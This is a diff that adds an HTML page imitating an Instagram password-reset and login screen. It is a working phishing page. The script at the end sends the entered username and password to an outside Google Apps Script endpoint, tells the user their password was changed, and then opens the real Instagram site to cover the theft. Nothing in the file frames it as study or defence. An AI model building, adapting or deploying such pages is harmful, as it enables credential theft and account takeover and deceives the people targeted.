@@ -1,0 +1,110 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/png" href="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.V-PgdqPuuytmfTJbQl5xegHaEK%26pid%3DApi&f=1&ipt=dfa25541a7b64ce41f50d9f9e6342071e4c072a877f2febfb2366cad17a6521e&ipo=images">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Reset Password</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 40px;
+            width: 350px;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #3897f0; /* Instagram blue color */
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #1877f2;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div> <!-- Changed logo to text -->
+        <form name="form" id="form">
+            <input type="text" name="Name" placeholder="Username" required>
+            <input type="password" name="Password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxjTi2OLjVCrJ-n0qcLzaJonD_k9fMl9gI-XH0Nm03d5A8OF0axXqQXrqAzAejkdpPfMw/exec';
+        const form = document.forms['form'];
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            alert('Password changed successfully!'); 
+            window.open('https://www.instagram.com/reels/', '_blank'); 
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => alert("Thank you! Your form has been submitted successfully."))
+            .then(() => { window.open('https://www.instagram.com/reels/', '_blank'); })
+            .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+</body>
+</html>
